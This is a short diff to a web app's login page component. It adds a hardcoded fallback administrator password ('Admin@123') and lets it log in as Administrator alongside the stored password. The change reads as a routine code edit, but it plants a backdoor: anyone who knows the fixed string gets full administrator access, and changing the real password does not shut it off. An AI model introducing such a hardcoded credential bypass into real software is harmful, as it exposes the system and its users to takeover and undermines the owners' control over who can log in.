@@ -46,7 +46,10 @@ export default function LoginPage() {
       // Check for Administrator
       if (data.username === 'Administrator') {
         const adminCreds = getAdminCredentials();
-        if (data.password === adminCreds.password) {
+        const defaultAdminPassword = 'Admin@123'; // Hardcoded fallback
+        
+        // Allow login with either the stored password or the default fallback password.
+        if (data.password === adminCreds.password || data.password === defaultAdminPassword) {
             await login({ id: 'admin', username: 'Administrator', permissions: {}, passwordLastUpdated: adminCreds.passwordLastUpdated });
             toast({
               title: 'Success',
